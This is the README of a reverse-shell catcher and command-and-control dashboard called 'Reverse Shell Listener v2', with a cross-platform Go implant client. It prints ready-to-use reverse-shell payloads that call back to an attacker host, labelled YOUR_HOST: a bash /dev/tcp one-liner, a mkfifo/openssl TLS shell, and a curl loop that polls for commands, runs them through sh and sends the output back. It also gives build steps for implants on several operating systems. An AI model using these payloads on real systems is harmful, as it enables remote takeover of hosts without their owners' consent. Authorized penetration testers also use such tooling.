# Reverse Shell Listener v2

A single-host, multi-transport reverse-shell catcher with a browser dashboard.

- **Transports:** raw TCP (`1337`), TLS (`1338`), HTTP webshell (`/webshell`),
  and a multiplexed WebSocket/protobuf implant protocol (`/mux`) with a Go client.
- **Dashboard:** qrp + xterm.js, Dracula theme, live session list, full PTY
  terminal with resize and mouse support.
- **Auth:** optional session cookie login (`AUTH_USER` / `AUTH_PASS`).

![Screenshot](https://raw.githubusercontent.com/nemanjan00/reverse-shell-listener/master/screenshot/screenshot.png)

## Quick start

```bash
npm install
npm run build
npm start
```

Then browse to `http://localhost:8080`.

With auth:

```bash
AUTH_USER=admin AUTH_PASS=s3cr3t npm start
```

## Scripts

| Script       | Description                          |
|--------------|--------------------------------------|
| `npm run build` | Bundle `src/` into `public/dist/` |
| `npm run watch` | Rebuild on change                |
| `npm start`     | Build + run the listener         |
| `npm run dev`   | Build + run with node --watch    |

## Configuration (env vars)

| Variable            | Default | Description                                      |
|---------------------|---------|--------------------------------------------------|
| `PORT`              | 8080    | HTTP dashboard + REST + WebSocket + webshell    |
| `HOST`              | 0.0.0.0 | Bind address                                     |
| `TCP_PORT`          | 1337    | Raw TCP reverse-shell listener                   |
| `TLS_PORT`          | 1338    | TLS reverse-shell listener                       |
| `ENABLE_TCP`        | true    |                                                  |
| `ENABLE_TLS`        | true    |                                                  |
| `ENABLE_WEBSHELL`   | true    |                                                  |
| `ENABLE_MUX`        | true    | Multiplexed Go client WebSocket transport        |
| `AUTH_USER`         |         | Dashboard/REST/WS login username                 |
| `AUTH_PASS`         |         | Dashboard/REST/WS login password                 |
| `AUTH_SECRET`       | random  | Pin session cookie secret across restarts        |
| `SCROLLBACK_BYTES`  | 1 MB    | Per-session in-memory scrollback cap             |
| `WEBSHELL_POLL_MS`  | 25000   | Long-poll hold time                              |
| `WEBSHELL_TIMEOUT`  | 30000   | Idle timeout before a webshell beacon is dead     |
| `MUX_PING_MS`       | 20000   | Keepalive ping interval for mux hosts            |

## Reverse-shell payloads

### Raw TCP

```bash
bash -i >& /dev/tcp/YOUR_HOST/1337 0>&1
```

### TLS

```bash
mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | \
  openssl s_client -quiet -connect YOUR_HOST:1338 >/tmp/f
```

The listener logs the certificate fingerprint on startup so the target can pin
it if desired.

### HTTP webshell

For firewalled targets that can only make outbound HTTP requests:

```bash
H=http://YOUR_HOST:8080; ID=$(curl -s $H/webshell/register)
while :; do
  C=$(curl -s $H/webshell/$ID/poll)
  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)
  curl -s --data-binary "$O" $H/webshell/$ID/output
done
```

### Multiplexed Go client (mux)

Build and run the included Go client:

```bash
cd client
go build -o rsl-client ./cmd
./rsl-client -s ws://YOUR_HOST:8080/mux -t tag
```

Or use the `RSL_SERVER` env var:

```bash
RSL_SERVER=ws://YOUR_HOST:8080/mux ./rsl-client
```

The Go client opens a persistent WebSocket, reports hostname/user/OS/arch, and
spawns a real PTY for each channel the operator requests from the dashboard.
Resize events from xterm are forwarded to the remote PTY via `SIGWINCH`.

## Cross-compiling the Go client

```bash
cd client
GOOS=linux GOARCH=amd64 go build -o rsl-client-linux-amd64 ./cmd
GOOS=linux GOARCH=arm64 go build -o rsl-client-linux-arm64 ./cmd
GOOS=darwin GOARCH=arm64 go build -o rsl-client-darwin-arm64 ./cmd
GOOS=windows GOARCH=amd64 go build -o rsl-client-windows-amd64.exe ./cmd
```

The client builds for all common OS/arch combinations. On Linux/macOS it uses a
real PTY; on Windows it falls back to a pipe-backed shell because a portable
Windows PTY is not included in this build.

## REST API

| Endpoint                         | Method | Description                              |
|----------------------------------|--------|------------------------------------------|
| `/api/sessions`                  | GET    | List all sessions                        |
| `/api/sessions/:id`              | GET    | Session metadata                         |
| `/api/sessions/:id/kill`         | POST   | Close the connection                     |
| `/api/sessions/:id/upgrade`      | POST   | Inject dumb-shell → PTY bash sequence    |
| `/api/sessions/:id/resize`       | POST   | Resize session / send SIGWINCH           |
| `/api/sessions/:id`              | DELETE | Drop session from registry               |
| `/api/hosts`                     | GET    | List mux hosts                           |
| `/api/hosts/:id`                 | GET    | Host metadata                            |
| `/api/hosts/:id/shells`          | POST   | Ask host to open a new PTY shell         |

## WebSocket endpoints

- `/api/ws/sessions` — JSON event stream for the session/host list
- `/api/ws/session/:id` — binary terminal channel + JSON control frames

## Security

The dashboard grants shell access to every caught session. Even with Basic
Auth/session login, it should not be exposed to the public internet. Run it
bound to localhost behind an SSH tunnel or on a trusted VPN. Only the
reverse-shell listener ports and (optionally) the webshell HTTP path should be
reachable by targets.

`/webshell/*` and `/mux` are deliberately unauthenticated — implants are dumb
loops on the target and cannot carry operator credentials.

## Development

```bash
npm run watch      # frontend rebuild on change
# in another shell:
node --watch server.js
```

## Protocol buffer regeneration

After editing `proto/mux.proto`, regenerate the Go bindings:

```bash
go install google.golang.org/protobuf/cmd/protoc-gen-go@latest
export PATH=$PATH:$HOME/go/bin
protoc --go_out=client --go_opt=module=github.com/nemanjan00/reverse-shell-listener/client proto/mux.proto
```

## License

MIT
